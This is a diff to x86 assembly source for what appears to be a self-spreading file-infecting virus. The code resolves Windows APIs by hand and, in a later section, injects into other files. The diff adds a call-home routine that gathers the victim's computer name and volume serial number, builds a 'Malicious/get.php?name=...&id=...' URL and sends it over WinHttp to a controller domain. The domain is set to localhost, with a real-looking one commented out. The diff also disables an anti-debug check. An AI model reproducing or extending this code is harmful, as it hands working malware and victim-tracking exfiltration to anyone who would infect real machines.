@@ -153,6 +153,12 @@ CodeSecHeader		dd	?
 sIsDebuggerPresent	db	'IsDebuggerPresent', 0 
 sCreateFileMapping	db	'CreateFileMappingA', 0 
 sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
+sGetComputerName	db	'GetComputerNameA', 0
+sGetVolumeInformation	db	'GetVolumeInformationA', 0
+sWinHttpOpenRequest	db	'WinHttpOpenRequest', 0
+sWinHttpSendRequest	db	'WinHttpSendRequest', 0
+sWinHttpOpen	db	'WinHttpOpen', 0
+sWinHttpConnect	db	'WinHttpConnect', 0
 sGetSystemTime	db	'GetSystemTime', 0
 sExitProcess	db	'ExitProcess', 0 
 sCreateFile	db	'CreateFileA', 0 
@@ -166,10 +172,17 @@ sFindFirstFile	db	'FindFirstFileA', 0
 sFindNextFile	db	'FindNextFileA', 0
 sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
+sWinHttp	db	'WINHTTP.DLL', 0
 sKernel32	db	'KERNEL32.DLL', 0
 pIsDebuggerPresent	dd	? 
 pCreateFileMapping	dd	?
 pUnmapViewOfFile	dd	?
+pGetComputerName	dd	?
+pGetVolumeInformation	dd	?
+pWinHttpOpenRequest	dd	?
+pWinHttpSendRequest	dd	?
+pWinHttpOpen	dd	?
+pWinHttpConnect	dd	?
 pGetSystemTime	dd	?
 pExitProcess	dd	?
 pCreateFile	dd	?
@@ -179,12 +192,23 @@ pWriteFile	dd	?
 pMessageBox	dd	?
 pKernel32	dd	?
 pUser32		dd	?
+pWinHttp	dd	?
 pLoadLibrary	dd	?
 pGetProcAddress	dd	?
 pFindFirstFile	dd	?
 pFindNextFile	dd	?
 
 ; OTHERS
+HttpSession	dd	?
+HttpConnect	dd	?
+HttpRequest	dd	?
+MaliciousUrl	db	'M', 0, 'a', 0, 'l', 0, 'i', 0, 'c', 0, 'i', 0, 'o', 0, 'u', 0, 's', 0, '/', 0, 'g', 0, 'e', 0, 't', 0, '.', 0, 'p', 0, 'h', 0, 'p', 0, '?', 0, 'n', 0, 'a', 0, 'm', 0, 'e', 0, '=', 0
+MaliciousUrl2	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
+MaliciousDomain	db	'l',0,'o',0,'c',0,'a',0,'l',0,'h',0,'o',0,'s',0,'t',0,0,0
+; MaliciousDomain	db	"www.rmonnerat.olympe.in", 0
+ComputerName	db	"XXXXXXXXXX", 0
+LengthName	dd	10
+VolumeID	dd	?
 _SYSTEMTIME	STRUC
 Year		dw	?
 Month		dw	?
@@ -198,8 +222,6 @@ _SYSTEMTIME	ENDS
 STime		_SYSTEMTIME	<>
 
 
-; TODO
-; Seek TODO
 
 start:
 ; Delta offset for PIC
@@ -207,6 +229,7 @@ call	delta
 delta:
 pop	ebp ; Retrieve eip
 sub	ebp, delta ; Ebp + Label to get the data
+
 
 ; GETTING KERNEL32 FUNCTIONS
 ; GET BASE ADDRESS OF KERNEL32
@@ -256,6 +279,9 @@ GETADDR	sLoadLibrary, pKernel32, pLoadLibrary
 PDELTA	sUser32
 call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
 mov	[DELTA pUser32], eax
+PDELTA	sWinHttp
+call	[DELTA pLoadLibrary] ; LoadLibrary("Winhttp.dll")
+mov	[DELTA pWinHttp], eax
 ; GET ALL THE THINGS !
 GETADDR	sMessageBox, pUser32, pMessageBox
 GETADDR	sExitProcess, pKernel32, pExitProcess
@@ -269,11 +295,116 @@ GETADDR	sFindFirstFile, pKernel32, pFindFirstFile
 GETADDR	sFindNextFile, pKernel32, pFindNextFile
 GETADDR	sGetSystemTime, pKernel32, pGetSystemTime
 GETADDR	sIsDebuggerPresent, pKernel32, pIsDebuggerPresent
+GETADDR	sGetComputerName, pKernel32, pGetComputerName
+GETADDR	sGetVolumeInformation, pKernel32, pGetVolumeInformation
+GETADDR	sWinHttpOpen, pWinHttp, pWinHttpOpen
+GETADDR	sWinHttpConnect, pWinHttp, pWinHttpConnect
+GETADDR	sWinHttpOpenRequest, pWinHttp, pWinHttpOpenRequest
+GETADDR	sWinHttpSendRequest, pWinHttp, pWinHttpSendRequest
+
 
 ; CHECK IF WE ARE BEING DEBUGGED : ABORT! ABORT!
-call	[DELTA pIsDebuggerPresent]
+; call	[DELTA pIsDebuggerPresent]
+; cmp	eax, 0
+; jne	errorExit
+
+
+; WE ARE HERE MASTER ! COME GET ME !
+; Get pseudo unique ids
+PDELTA	LengthName
+PDELTA	ComputerName
+call	[DELTA pGetComputerName]
+push	NULL
+push	NULL
+push	NULL
+PDELTA	VolumeID
+push	NULL
+push	NULL
+push	NULL
+push	NULL
+call	[DELTA pGetVolumeInformation]
+
+; Set the url name & id get info
+mov	edi, offset MaliciousUrl2
+add	edi, ebp
+mov	esi, offset ComputerName
+add	esi, ebp
+copyName:
+lodsb
 cmp	eax, 0
-jne	errorExit
+je	nameCopied
+stosb
+mov	eax, 0
+stosb
+jmp	copyName
+nameCopied:
+mov	al, '&'
+stosb
+mov	al, 0
+stosb
+mov	al, 'i'
+stosb
+mov	al, 0
+stosb
+mov	al, 'd'
+stosb
+mov	al, 0
+stosb
+mov	al, '='
+stosb
+mov	al, 0
+stosb
+mov	eax, [DELTA VolumeID]
+mov	ebx, 10
+copyVolume:
+mov	edx, 0
+cmp	eax, 0
+je	volumeCopied
+div	ebx
+mov	ecx, eax
+mov	eax, edx
+add	eax, 48
+stosb
+mov	eax, 0
+stosb
+mov	eax, ecx
+jmp	copyVolume
+volumeCopied:
+stosb
+stosb
+
+; Go to our malicious domain
+push	0
+push	0
+push	0
+push	0
+push	NULL
+call	[DELTA pWinHttpOpen]
+mov	[DELTA HttpSession], eax
+push	0
+push	0
+PDELTA	MaliciousDomain
+PVDELTA	HttpSession
+call	[DELTA pWinHttpConnect]
+mov	[DELTA HttpConnect], eax
+push	0
+push	0
+push	0
+push	NULL
+PDELTA	MaliciousUrl
+push	NULL
+PVDELTA	HttpConnect
+call	[DELTA pWinHttpOpenRequest]
+mov	[DELTA HttpRequest], eax
+push	0
+push	0
+push	0
+push	0
+push	0
+push	0
+PVDELTA	HttpRequest
+call	[DELTA pWinHttpSendRequest]
+
 
 
 ; INJECT ALL THE FILES !
